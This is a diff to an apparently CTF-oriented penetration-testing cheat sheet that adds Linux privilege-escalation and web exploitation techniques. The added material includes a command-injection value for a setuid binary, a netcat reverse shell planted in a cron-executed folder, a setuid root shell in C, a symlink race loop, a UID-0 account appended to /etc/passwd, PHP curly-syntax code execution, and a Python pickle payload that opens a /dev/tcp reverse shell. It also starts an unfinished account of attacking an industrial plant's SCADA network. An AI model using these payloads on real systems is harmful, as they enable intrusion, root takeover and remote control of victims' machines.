@@ -1604,20 +1604,6 @@ A few 'common' places: /tmp, /var/tmp, /dev/shm
 
   find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
 
-* If the below files are world writable, we could do privilege escalation.
-
- * /etc/passwd 
-
-  * Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information. 
-  * For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow. 
-  * Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled. 
-  * If passwordless accounts are disabled, you can put the hash of a password of your choice. You can use the crypt function to generate password hashes, for example
-
-   ::
-    
-      perl -le 'print crypt("foo", "aa")' to set the password to foo. 
-
-  * It's possible to gain root access even if you can only append to /etc/passwd and not overwrite the contents. That's because it's possible to have multiple entries for the same user, as long as they have different names — users are identified by their ID, not by their name, and the defining feature of the root account is not its name but the fact that it has user ID 0. So you can create an alternate root account by appending a line that declares an account with another name, a password of your choice and user ID 0
 
 Any "problem" files?
 ^^^^^^^^^^^^^^^^^^^^
@@ -1642,9 +1628,18 @@ After compromising the machine with an unprivileged shell, /home would contains 
 
 .. Tip :: Find files by wheel/ adm users or the users in the home directory.
 
+Other Linux Privilege Escalation
+--------------------------------
+
 Execution of binary from Relative location than Absolute
---------------------------------------------------------
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 If we figure out that a suid binary is running with relative locations (for example let's say backjob is running "id" and "scp /tmp/special ron@ton.home")(figured out by running strings on the binary). The problem with this is, that it’s trying to execute a file/script/program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.
+
+Something like this:
+
+::
+
+ system("/usr/bin/env echo and now what?");
 
 so we can create a file in temp:
 
@@ -1680,8 +1675,77 @@ If we execute a binary without specifying an absolute paths, it goes in order of
 
 It is important to see .bash_profile file which contains the $PATH
 
+Environment Variable Abuse
+^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If the suid binary contains a code like
+
+::
+
+   asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
+   printf("about to call system(\"%s\")\n", buffer);
+   system(buffer);
+
+We can see that it is accepting environment variable USER which can be user-controlled. In that case just define USER variable to
+
+::
+
+ USER=";/bin/sh;"
+
+When the program is executed, USER variable will contain /bin/sh and will be executed on system call.
+
+::
+
+ echo $USER
+ ;/bin/sh;
+ 
+ levelXX@:/home/flagXX$ ./flagXX
+ about to call system("/bin/echo ;/bin/sh; is cool")
+
+ sh-4.2$ id
+ uid=997(flagXX) gid=1003(levelXX) groups=997(flagXX),1003(levelXX)
+
+World-Writable Folder with a Script executing any file in that folder using crontab
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If there exists any world-writeable folder plus if there exists a cronjob which executes any script in that world-writeable folder such as 
+
+::
+
+ #!/bin/sh
+
+ for i in /home/flagXX/writable.d/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+ done
+
+then either we can create a script in that folder /home/flagXX/writeable.d which gives us a reverse shell like
+
+::
+
+ echo "/bin/nc.traditional -e /bin/sh 192.168.56.1 22" > hello.sh
+
+or 
+
+we can create a suid file to give us the privileged user permission
+
+::
+
+ #!/bin/sh
+ gcc /var/tmp/shell.c -o /var/tmp/flagXX
+ chmod 4777 /var/tmp/flagXX
+
+Considering shell.c contains
+
+::
+
+ int main(void) {
+ setgid(0); setuid(0);
+ execl("/bin/sh","sh",0); }
+
+
 Symlink Creation
-----------------
+^^^^^^^^^^^^^^^^
 
 Multiple time, we would find that a suid binary belonging to another user is authorized to read a particular file. For example Let's say there's a suid binary called readExampleConf which can read a file named example.conf as a suid user. This binary can be tricked into reading any other file by creating a Symlink or a softlink. For example if we want to read /etc/shadow file which can be read by suid user. we can do
 
@@ -1723,31 +1787,73 @@ where as in the second one ( ln -s /etc/ sym_fold/ ), we first create a folder s
 
 This might be useful to bypass some filtering, when let's say a cronjob is running but refuses to take backup of anything named /etc . In that case, we can create a symlink inside a folder and take the backup. 
 
-MySQL Privileged Escalation
----------------------------
+Time of check to time of use
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize `User-Defined Function (UDF) Dynamic Library Exploit <http://www.0xdeadbeef.info/exploits/raptor_udf.c>`_ . A blog named `Gaining a root shell using mysql user defined functions and setuid binaries <https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/>`_  
-
-More Information
-^^^^^^^^^^^^^^^^
-
-* The MySQL service should really not run as root. The service and all mysql directories should be run and accessible from another account - mysql as an example.
-
-* When MySQL is initialized, it creates a master account (root by default) that has all privileges to all databases on MySQL. This root account differs from the system root account, although it might still have the same password due to default install steps offered by MySQL.
-
-* Commands can be executed inside MySQL, however, commands are executed as the current logged in user.
+In Unix, if a binary program such as below following C code (uses access to check the access of the specific file and open to open a specific file), when used in a setuid program, has a TOCTTOU bug:
 
 ::
 
-  mysql> \! sh
 
-Cron.d
-------
+ if (access("file", W_OK) != 0) {
+   exit(1);
+ }
 
-Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.
+ fd = open("file", O_WRONLY);
+ //read over /etc/shadow
+ read(fd, buffer, sizeof(buffer));
+ 
+Here, access is intended to check whether the real user who executed the setuid program would normally be allowed to write the file (i.e., access checks the real userid rather than effective userid). This race condition is vulnerable to an attack:
+
+Attacker
+
+::
+
+ // 
+ //
+ // After the access check
+ symlink("/etc/shadow", "file");
+ // Before the open, "file" points to the password database
+ //
+ //
+
+
+In this example, an attacker can exploit the race condition between the access and open to trick the setuid victim into overwriting an entry in the system password database. TOCTTOU races can be used for privilege escalation, to get administrative access to a machine.
+
+Let's see how we can exploit this?
+
+In the below code, we are linking the file which we have access (/tmp/hello.txt) and the file which we want to read (and currently don't have access) (/home/flagXX/token). The f switch on ln makes sure we overwrite the existing symbolic link. We run it in the while true loop to create the race condition.
+
+::
+
+  while true; do ln -sf /tmp/hello.txt /tmp/token; ln -sf /home/flag10/token /tmp/token ; done
+
+We would also run the program in a while loop
+
+::
+
+ while true; do ./flagXX /tmp/token 192.168.56.1 ; done
+
+Learning:
+
+Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.” 
+
+Writable /etc/passwd or account credentials came from a legacy unix system
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+* Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information. 
+* For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow. 
+* Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled. 
+* If passwordless accounts are disabled, you can put the hash of a password of your choice. You can use the crypt function to generate password hashes, for example
+
+ ::
+    
+   perl -le 'print crypt("foo", "aa")' to set the password to foo. 
+
+* It's possible to gain root access even if you can only append to /etc/passwd and not overwrite the contents. That's because it's possible to have multiple entries for the same user, as long as they have different names — users are identified by their ID, not by their name, and the defining feature of the root account is not its name but the fact that it has user ID 0. So you can create an alternate root account by appending a line that declares an account with another name, a password of your choice and user ID 0
 
 Elevating privilege from a suid binary
---------------------------------------
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
 If we have ability to create a suid binary, we can use either 
 
@@ -1770,6 +1876,30 @@ or
 However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it's a symlink to bash, it won't provide us suid privileges, bash automatically drops its privileges when it's being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.
 
 More details can be found at `Common Pitfalls When Writing Exploits <http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html>`_
+
+
+MySQL Privileged Escalation
+---------------------------
+
+If mysql (version 4.x, 5.x) process is running as root and we do have the mysql root password and we are an unprivileged user, we can utilize `User-Defined Function (UDF) Dynamic Library Exploit <http://www.0xdeadbeef.info/exploits/raptor_udf.c>`_ . A blog named `Gaining a root shell using mysql user defined functions and setuid binaries <https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/>`_  
+
+More Information
+^^^^^^^^^^^^^^^^
+
+* The MySQL service should really not run as root. The service and all mysql directories should be run and accessible from another account - mysql as an example.
+
+* When MySQL is initialized, it creates a master account (root by default) that has all privileges to all databases on MySQL. This root account differs from the system root account, although it might still have the same password due to default install steps offered by MySQL.
+
+* Commands can be executed inside MySQL, however, commands are executed as the current logged in user.
+
+::
+
+  mysql> \! sh
+
+Cron.d
+------
+
+Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.
 
 
 Unattended APT - Upgrade
@@ -2641,7 +2771,15 @@ and
 	
 :: 
 	
-  proxychains4 remmina
+  proxychains4 remmina/ rdesktop
+
+If we have to share a interesting story with you, Recently, We were assigned a engagment to compromise a industrial plant. Let us walkthru what's the scenario.
+
+Scenario:
+
+* Attacker IP Network : 172.40.60.0/22; Attacker Current IP: 172.40.60.55 and Targetted IP: 172.16.96.2 (Possible SCADA Network - Natted IP)
+* As it's a industrial plant, there's a firewall between IT Network (172.40.60.0/22) and SCADA Network (Possible IP 172.16.96.2 -- This is NATTed IP)
+* 
 
 HTTP
 ----
@@ -2769,12 +2907,23 @@ Delete all lines between tags including tags:
 
 HTTP 404 Custom Page
 ^^^^^^^^^^^^^^^^^^^^
-Sometimes, it's a good idea to look at 404 custom page also. There might be some information store.d
+Sometimes, it's a good idea to look at 404 custom page also. There might be some information stored
 
 PHP
 ^^^
 
-* PHP's preg_replace() function which can lead to RCE. It's deprecated in later revisions (PHP >= 5.5.0). If you think there's a pattern which is replaced in a text, refer `The unexpected dangers of preg_replace() <https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace>`_ 
+* PHP's preg_replace() function which can lead to RCE. It's deprecated in later revisions (PHP >= 5.5.0). If you think there's a pattern which is replaced in a text, refer `The unexpected dangers of preg_replace() <https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace>`_ and `Exploiting PHP PCRE Functions <http://www.madirish.net/402>`_ 
+
+* PHP has `Complex (curly) syntax <http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex>`_ The Complex Syntax to allow evaluation of our own code in double quotes. 
+  
+  Example
+  
+  :: 
+  
+   $use_me = "ls -lah"
+   {${system($use_me)}}
+
+  This works because the outside curly brackets say give the contents of a variable/method/has to start with $, which is why we need the inner ${} to act as a variable. {${system($use_me)}} means, give the contents of ${system($use_me)} which in turn means use the contents of a variable named by the output of system($use_me).
 
 Docker Security
 ---------------
@@ -3578,6 +3727,28 @@ Others
 
 * Sometimes, we don't have tools on the victim machine, in that case we can download static binaries from `Static-Binaries <https://github.com/andrew-d/static-binaries>`_ If not, found, try the deb or rpm package of the binary, extract it and upload.
 
+* If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like 
+
+  ::
+
+   conn,addr = self.receiver_socket.accept()
+   data = conn.recv(1024)
+   return cPickle.loads(data)
+
+ we may use
+
+ ::
+
+  class Shell_code(object):
+  def __reduce__(self):
+          return (os.system,('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))
+  shell = cPickle.dumps(Shell_code())
+  client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  client_socket.connect(('Server IP','Server PORT'))
+  client_socket.send(shell)
+
+ Refer `Understanding Python pickling and how to use it securely <https://www.synopsys.com/blogs/software-security/python-pickling/>`_
+
 * Handy Stuff
 
  * Utilize xxd to convert hex to ascii
@@ -4163,5 +4334,6 @@ In this case, if we change the input type of sinfo from text to file. We can upl
 Now, when we press submit button, probably, just make sure that the request is quite similar to the original one and we should be able to upload the file.
 
 .. Tip :: Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!
+
 
 .. disqus::
